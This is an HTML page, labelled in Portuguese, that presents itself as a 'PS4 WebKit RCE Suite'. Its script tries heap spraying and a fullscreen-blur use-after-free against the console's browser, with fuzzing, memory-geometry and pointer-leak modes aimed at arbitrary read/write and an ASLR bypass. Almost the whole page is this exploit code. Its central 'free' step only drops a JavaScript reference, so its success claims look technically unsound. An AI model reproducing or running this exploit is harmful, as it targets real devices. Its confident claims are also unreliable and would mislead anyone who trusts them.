<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 RCE SUITE V2.0 (AUTO-FUZZER)</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: Consolas, monospace; padding: 20px; }
        .panel { border: 1px solid #30363d; background: #161b22; padding: 20px; margin-bottom: 20px; border-radius: 6px; }
        h1 { color: #f0f6fc; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
        h3 { color: #f0f6fc; margin-top: 0; }
        button { background: #238636; color: #fff; border: none; padding: 10px 20px; font-size: 14px; cursor: pointer; border-radius: 6px; margin-right: 10px; font-weight: bold; }
        button:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
        button.secondary { background: #1f6feb; }
        #log { width: 98%; height: 400px; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; overflow-y: scroll; padding: 10px; font-size: 12px; margin-top: 10px; }
        .success { color: #3fb950; font-weight: bold; }
        .fail { color: #f85149; }
        .info { color: #8b949e; }
        .highlight { color: #d29922; font-weight: bold; }
    </style>
</head>
<body>

<h1>PS4 WEBKIT RCE SUITE V2.0</h1>
<p>Status: <span id="status" class="highlight">Aguardando Seleção...</span></p>

<div class="panel">
    <h3>PASSO 1: Selecione o Módulo Automático</h3>
    <p>Escolha uma estratégia. O script configurará o Heap automaticamente.</p>
    
    <button class="secondary" onclick="setupMode('FUZZER')">MÓDULO A: Auto-Length Fuzzer</button>
    <button class="secondary" onclick="setupMode('GEOMETRY')">MÓDULO B: Geometry Mapper</button>
    <button class="secondary" onclick="setupMode('LEAK')">MÓDULO C: Structure ID Leak</button>
    <br><br>
    <div id="descModule" class="info">Selecione um módulo acima para ver a descrição.</div>
</div>

<div class="panel">
    <h3>PASSO 2: Execução</h3>
    <button id="btnAlloc" onclick="runAllocation()" disabled>1. ALOCAR HEAP</button>
    <button id="btnTrigger" onclick="triggerExploit()" disabled>2. GATILHO (FULLSCREEN)</button>
    <br><br>
    <button id="btnCheck" onclick="checkResults()" disabled style="background:#d29922; color:black;">3. CHECAR RESULTADOS</button>
</div>

<div id="log">Logs do sistema aparecerão aqui...</div>

<script>
    const LOG = document.getElementById('log');
    function log(html) { LOG.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${html}</div>`; LOG.scrollTop = LOG.scrollHeight; }

    // --- CONFIGURAÇÃO ---
    // Header Falso para Length (0x10000)
    const FAKE_LENGTH = 1.3906717577229e-309; 
    const POISON_VAL = 2.121995791e-314; // 0x4141...

    var currentMode = "";
    var victims = [];
    var neighbors = [];
    var sprayStorage = [];
    const COUNT_PER_ZONE = 2000;
    const ZONES = 5; // Testar 5 alinhamentos diferentes

    // Helper para Hex
    var buf = new ArrayBuffer(8);
    var f64 = new Float64Array(buf);
    var u32 = new Uint32Array(buf);
    function float2hex(val) {
        f64[0] = val;
        return "0x" + u32[1].toString(16).padStart(8,'0') + u32[0].toString(16).padStart(8,'0');
    }

    function setupMode(mode) {
        currentMode = mode;
        document.getElementById('btnAlloc').disabled = false;
        document.getElementById('status').innerText = "Modo: " + mode;
        
        let desc = "";
        if(mode === 'FUZZER') desc = "Divide o Heap em 5 zonas. Cada zona recebe um Spray de tamanho diferente (24, 32, 40, 48, 56 bytes). Tenta acertar o Length do vizinho na força bruta.";
        if(mode === 'GEOMETRY') desc = "Escreve IDs únicos nas vítimas. Após o exploit, varre os vizinhos para ver qual ID apareceu onde. Calcula a distância exata entre os objetos.";
        if(mode === 'LEAK') desc = "Tenta ler metadados do Heap. Se encontrarmos valores que parecem ponteiros (StructureID), temos bypass de ASLR.";
        
        document.getElementById('descModule').innerText = desc;
        log(`Modo selecionado: <span class="highlight">${mode}</span>`);
    }

    function runAllocation() {
        log("Iniciando Alocação Multi-Zona...");
        victims = [];
        neighbors = [];
        sprayStorage = [];

        try {
            // Criamos Zonas para testar variações
            for(let z=0; z<ZONES; z++) {
                log(`...Preenchendo Zona ${z+1}/${ZONES}`);
                for(let i=0; i<COUNT_PER_ZONE; i++) {
                    // Vizinho (O que queremos afetar)
                    let n = new Float64Array(8);
                    n[0] = 0.1; // Marcador float limpo
                    n.zone = z; // Metadado JS para debug
                    n.id = i;
                    neighbors.push(n);

                    // Vítima (O buraco)
                    let v = new Float64Array(8);
                    
                    if(currentMode === 'GEOMETRY') {
                        // No modo geometria, escrevemos um "Rastreador"
                        // 0xZZZZIIII (Zona + Index)
                        let tracker = (z * 100000) + i; 
                        v[0] = tracker; 
                    } else {
                        v.fill(1.1);
                    }
                    victims.push(v);
                }
            }
            log("<span class='success'>Heap Pronto!</span> Memória particionada.");
            document.getElementById('btnTrigger').disabled = false;
        } catch(e) { log("Erro: " + e); }
    }

    function triggerExploit() {
        log("Solicitando Fullscreen...");
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        else el.requestFullscreen();

        window.onblur = function() {
            log("BLUR! UAF Disparado.");
            
            // 1. FREE
            victims = null;

            // 2. SPRAY MULTI-CALIBRE
            // Aqui está a mágica da V2.0: Spray diferente para cada zona
            // Isso cobre erros de alinhamento automaticamente
            
            try {
                // Zona 0: Size 24 (Padrão)
                fillZone(24, 0);
                // Zona 1: Size 32 (+8 bytes shift)
                fillZone(32, 1);
                // Zona 2: Size 40 (+16 bytes shift)
                fillZone(40, 2);
                // Zona 3: Size 48 (+24 bytes shift)
                fillZone(48, 3);
                // Zona 4: Size 56 (+32 bytes shift)
                fillZone(56, 4);
                
                // Spray extra para garantir
                for(let k=0; k<5000; k++) sprayStorage.push(new Float64Array(32));

            } catch(e) {}

            log("Spray Multi-Zona concluído.");
            document.getElementById('btnCheck').disabled = false;
            document.getElementById('status').innerText = "Exploit Rodou. Verifique.";
        };
    }

    function fillZone(size, zoneIndex) {
        // Enche aproximadamente a quantidade de arrays daquela zona
        // Usamos um valor ligeiramente maior para garantir overflow
        let count = COUNT_PER_ZONE + 200; 
        
        for(let i=0; i<count; i++) {
            let s = new Float64Array(size); // Tamanho variável!
            
            if(currentMode === 'FUZZER') {
                // Tenta injetar o Length Falso em todas as posições possíveis
                s.fill(FAKE_LENGTH);
            } else if (currentMode === 'GEOMETRY') {
                // Injeta um padrão reconhecível para ver se sobrescreve o vizinho
                s.fill(1337.1337); 
            } else if (currentMode === 'LEAK') {
                // No modo Leak, tentamos sobrescrever com zeros para ver se
                // o vizinho lê "através" do nosso objeto
                s.fill(0); 
            }
            
            sprayStorage.push(s);
        }
    }

    function checkResults() {
        log("Iniciando Análise Forense...");
        let found = false;

        if(currentMode === 'FUZZER') {
            // Checa se algum length mudou
            for(let i=0; i<neighbors.length; i++) {
                if(neighbors[i].length > 8) {
                    found = true;
                    let z = Math.floor(i / COUNT_PER_ZONE);
                    log(`<span class='success'>[!!!] SUCESSO NA ZONA ${z}!</span>`);
                    log(`Vizinho Index: ${i} | Novo Length: <span class='highlight'>${neighbors[i].length}</span>`);
                    log(`Tamanho de Spray vencedor: ${24 + (z*8)} bytes`);
                    log("Tire foto! Isso prova Arbitrary R/W.");
                    break;
                }
            }
        } 
        else if (currentMode === 'GEOMETRY') {
            // Checa se o valor 1337.1337 apareceu dentro de um vizinho
            // Isso prova que o spray (Vítima) invadiu o Vizinho
            for(let i=0; i<neighbors.length; i++) {
                if(neighbors[i][0] === 1337.1337) {
                    found = true;
                    log(`<span class='success'>[+] VIZINHO CORROMPIDO!</span>`);
                    log(`Index: ${i}. O valor foi alterado pelo spray.`);
                    log(`Isso confirma overlap físico na memória.`);
                    break;
                }
            }
        }
        else if (currentMode === 'LEAK') {
            // Checa por valores estranhos que pareçam ponteiros
            // O valor normal é 0.1 (alocado no inicio)
            // Se lermos algo muito grande ou muito pequeno, é vazamento
            for(let i=0; i<neighbors.length; i++) {
                let val = neighbors[i][0];
                if(val !== 0.1 && val !== 0) {
                    found = true;
                    let hex = float2hex(val);
                    log(`<span class='success'>[?] ANOMALIA DETECTADA</span>`);
                    log(`Index: ${i} | Valor: ${val}`);
                    log(`Hex: <span class='highlight'>${hex}</span>`);
                    log("Se o Hex parecer com 0x00001234... é um StructureID Leak!");
                }
            }
        }

        if(!found) {
            log("<span class='fail'>Nenhuma alteração detectada nesta tentativa.</span>");
            log("Tente recarregar a página para resetar o Heap.");
        }
    }

</script>
</body>
</html>
